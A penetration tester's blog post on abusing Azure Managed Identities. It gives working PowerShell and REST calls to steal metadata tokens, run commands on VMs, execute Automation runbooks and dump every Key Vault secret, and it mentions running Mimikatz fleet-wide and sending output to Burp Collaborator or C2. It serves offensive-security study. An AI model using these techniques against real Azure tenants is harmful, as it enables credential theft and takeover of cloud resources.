---
layout: default
title: "Azure blog"
permalink: /azure-blog-temp
---

### Introduction
One part of Azure security that I haven’t seen getting a lot of attention is the abuse of Managed Identities. In this post I’d like to briefly discuss some development I’ve done with Managed Identities and how we can further expand this.

### What are managed identities?
In Azure, a managed identity is an abstraction that lets certain service instances access other services without credentials. When you create a Virtual Machine, for example, you have the option to assign it a System-Assigned managed identity, which will create an identity for that VM in your Azure tenant. You can then grant that managed identity access to other resources, like a key vault. This allows administrators to avoid needing the VM to use a password to access other services, so there’s no need to have passwords sitting in config files. System-assigned identities are one of two types of identities in Azure, the other kind being User-Assigned. The function they provide is the same, but a user-assigned identity can be assigned to multiple resources and are managed independent of those resources, whereas the system-assigned identity is unique to each resource.

### Why do we care about managed identities?
The classic example for a Server-side Request Forgery (SSRF) attack, where an attacker can force an application to make an HTTP request on their behalf, is to request a token from the AWS metadata endpoint which can then be used for authentication to AWS as that resource. This sort of attack has not received as much attention in Azure for two reason: it’s less common for hosts to have an identity assigned, and the metadata endpoint requires a header to be sent in the request to retrieve information. The latter negates a large chunk of SSRF attacks as it requires the user to have control over the headers being sent in the request, rather than just the destination (AWS has recently implemented a similar mechanism). This means that the more likely scenario for retrieving a set of credentials is achieving code execution on the host, which is a much more severe issue than an SSRF.

The former point, that it’s less common for instances to have an identity assigned, simply means that this attack is possible less often. However, checking for it is as simple as PowerShell one liner and it can yield some great results, so there's no reason not to check.

If you're curious, that one liner looks like this. If this doesn't return an error, you should have access to a managed identity.
```
$response = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
```

### How do we abuse a managed identity token?
As described in other blog posts on this subject, we may be able to authenticate using one of the various libraries from Microsoft, such as the Azure CLI or the Az Powershell Module. However, I have yet to run into these installed on a host in the wild. Depending on the environment you may be able to install and run these tools, but I prefer to avoid making changes on the endpoint wherever possible. To that end, we have another option available: The REST Management API provided by Microsoft (https://docs.microsoft.com/en-us/rest/api/azure/). We can do pretty much anything with the API that we can do with a command line tool, it’s just more tedious.

Microsoft’s documentation of the API is complete, though some requests will take a bit of tinkering to get them working. For any action you would want to perform on a service there should be a request to list out instances by region, and then to create, update, or delete those instances. Using this, it’s fairly straightforward to reimplement existing Azure tooling to use the API.
For example, here’s how to run a command in a VM using the Az CLI.
``` sh
az vm run-command invoke  --command-id RunPowerShellScript --name win-vm -g my-resource-group --scripts @script.ps1 --parameters "arg1=somefoo" "arg2=somebar"
```

And in PowerShell.
```
Invoke-AzVMRunCommand -ResourceGroupName '<myResourceGroup>' -Name '<myVMName>' -CommandId 'RunPowerShellScript' -ScriptPath '<pathToScript>' -Parameter @{"arg1" = "var1";"arg2" = "var2"}
```
And finally, with the API.
```
Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$SubscriptionId,"/resourceGroups/",$resourceGroup,"/providers/Microsoft.Compute/virtualMachines/",$vmName,"/runCommand?api-version=2020-06-01")) -Verbose:$false -ContentType "application/json" -Method POST -Body '{"commandId":"RunPowershellScript","script":["' + $commandToExecute + '"],"parameters":[]}' -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing
```

These are all pretty similar, however in my experience there’s often caveats with the API. In this case, we can’t view the output of the command. There is an option to send the output to an Azure blob, but this might not be an option or desirable depending on the environment. The workaround to this is either running a payload to establish the C2 channel of your choice, or you can do something like direct the output to a variable and send that variable to something like Burp Collaborator. The latter may be preferable for doing an Invoke-Mimikatz across an entire fleet of VMs to avoid nuking your C2 server.

Another way of executing commands in Azure is using Automation Account runbooks. As documented by NetSPI, Automation Account runbooks can be used to perform actions on behalf of the automation account, which may have access to more resources than our managed identity. (You can find my REST implementation of this in the MicroBurst repository)

Creating a new runbook through PowerShell looks like this:
```
Import-AzAutomationRunbook -Path script.ps1 -ResourceGroup $resourceGroupName -AutomationAccountName $automationAccountName -Type PowerShell -Name $name
Publish-AzAutomationRunbook -AutomationAccountName $automationAccountName -ResourceGroup $resourceGroupName -Name $name
$job = Start-AzAutomationRunbook -Name $jobName -ResourceGroupName $resourceGroupName -AutomationAccountName $automationAccountName
$jobstatus = Get-AzAutomationJob -AutomationAccountName $automationAccountName -ResourceGroupName $resourceGroupName -Id $job.JobId
#Insert loop here to wait for output...
$output = Get-AzAutomationJobOutput -ResourceGroupName $resourceGroupName -AutomationAccountName $automationAccountName -Id $job.JobId
```
And in the managed API:
``` powershell
$draftBody = -join ('{"properties":{"runbookType":"PowerShell","draft":{}},"name":"',$runbookName,'","location":"eastus"}')
$createDraft= ((Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/runbooks/',$runbookName,'?api-version=2015-10-31')) -Verbose:$false -ContentType "application/json" -Method PUT -Body $draftBody -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content | ConvertFrom-Json).value
$editDraftBody = Get-Content $targetScript -Raw
$editDraft = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/runbooks/',$runbookName,'/draft/content?api-version=2015-10-31')) -Verbose:$false -ContentType "text/powershell" -Method PUT -Body $editDraftBody -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content
$publishDraft = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/runbooks/',$runbookName,'/draft/publish?api-version=2015-10-31')) -Verbose:$false -Method POST -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content
$jobBody = -join ('{"properties":{"runbook":{"name":"',$runbookName,'"},"runOn":""}}')
$jobGUID = [GUID]::NewGuid().ToString()
$startJob = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/jobs/',$jobGUID,'?api-version=2015-10-31')) -Verbose:$false -ContentType "application/json" -Method PUT -Body $jobBody -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content
#Insert loop here to wait for output...
$jobsResults = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/jobs/',$jobGUID,'/output?api-version=2015-10-31')) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing)
```

Again pretty similar, but again just a bit more verbose and we have to handle a few more things on our end like getting the content of the script and creating a GUID for the job.

### Pitfall: the "nextLink" parameter

For many operations, such as running a command on a VM or getting the contents of a keyvault, we need to list out all of the instances so we know what we can target. This is simple enough, almost always just a GET request to the appropriate endpoint (ie: /subscriptions/$sub/resources/Microsoft.Compute, for VMs) will return a list of resources. However this only return 25 resources back to us! So if we have a large number of instances, we will only see part of them in that request. That's where the nextLink parameter comes into play: if there are more objects to load, our GET request will come with a link to fetch the next group of objects. So any time we need to list resources we need to check for this parameter, and loop through all available links to get all of the resources if necessary. This is a pretty small inconvenience in the grand scheme of things, but it's another thing to take into account while working with the API. Personally, I was on an engagement and didn't realize that the keyvault I was dumping had almost double as many secrets as I was actually getting back. When I later got access to the environment via the portal and noticed this, I doubled back and discovered what was happening.

To recreate this I created a keyvault with 101 secrets in it.

```
PS C:\> $results = (Invoke-WebRequest -Uri (-join ('https://example-kv.vault.azure.net/secrets?&api-version=7.1')) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $vaultToken"} -UseBasicParsing).Content | ConvertFrom-Json
{"value":[{"id":"https://example-kv.vault.azure.net/secrets/Secret0","attributes":{"enabled":true,"created":161
2487452,"updated":1612487452,"recoveryLevel":"Recoverable+Purgeable","recoverableDays":90}}
...TRUNCATED...
],"nextLink":"https://example-kv.vault.azure.net:443/secrets?api-version=7.1&$skiptoken
=eyJOZXh0TWFya2VyIjoiMiE4MCFNREF3TURFMUlYTmxZM0psZEM5VFJVTlNSVlF6TUNFd01EQXdNamdoT1RrNU9TMHhNaTB6TVZReU16bzFPVG8xT1M0NU9U
azVPVGs1V2lFLSIsIlRhcmdldExvY2F0aW9uIjowfQ"}
```

I've truncated the output as it's rather lengthy, but 25 secrets are returned. Anyways, to fetch the rest of the secrets vault we just have to keep making requests to the nextLink.

```
$nextLink = $results.nextLink
$runningList += $results.value
while($nextLink){#make another web request}
```

Eventually you'll end up with a request with a null nextLink, meaning we've fetched all of the resources.

```
{"value":[{"id":"https://example-kv.vault.azure.net/secrets/Secret99","attributes":{"enabled":true,"created":16
12487630,"updated":1612487630,"recoveryLevel":"Recoverable+Purgeable","recoverableDays":90}}],"nextLink":null}
```

### Manually discovering accessible resources
Something I've run into a few times is that after enumerating all of the common Azure goodies based on subscription, I didn't have access to that much. Sometimes this is just the case and the identity is a dud, but other times some more digging is warranted.

On occasion, managed identities will have been granted access to resources that are not in the subscriptions that you can list out. Since most of the time that we get a managed identity token is through code execution on the host, we can start to look on the host for references to Azure resources in configuration files or logs. The two strings that have gotten me the most value are: "core.windows.net" and "vault.azure.net". This will look for file shares and keyvaults, which are sometimes used for the configuration of the VM to pull down scripts and set up accounts. Another place to look is in the extensions for the VM, which can be done either locally on the VM or through the API.

If you find a reference to a keyvault, you can then use the API (with a token scoped to vault.azure.net) to dump secrets from it.

### Whatever, give me the scripts
I've posted a few scripts on my GitHub which you can find here. They are mostly reimplementations/rip-offs from MicroBurst and PowerZure that I have reworked to use the API instead.

Those scripts include:
* Dumping the contents of runbooks
* Running a runbook/dumping creds with runbooks
* Running a command in a VM
* Dumping the configuration of an App Services application

### Conclusion
In the future I'd like to implementing more Azure tooling to use the API, so stay tuned.

Anyways, I hope this post can be helpful in securing your (or someone else's) Azure environment. If you have any further thoughts or experiences with Managed Identities I'd love to hear them, and you can find me on Twitter @passthehashbrwn.

### Sources

https://hausec.com/2020/01/31/attacking-azure-azure-ad-and-introducing-powerzure/
https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/
https://github.com/netspi/microburst
https://docs.microsoft.com/en-us/rest/api
https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview
https://www.l9group.com/research/abusing-aws-metadata-service
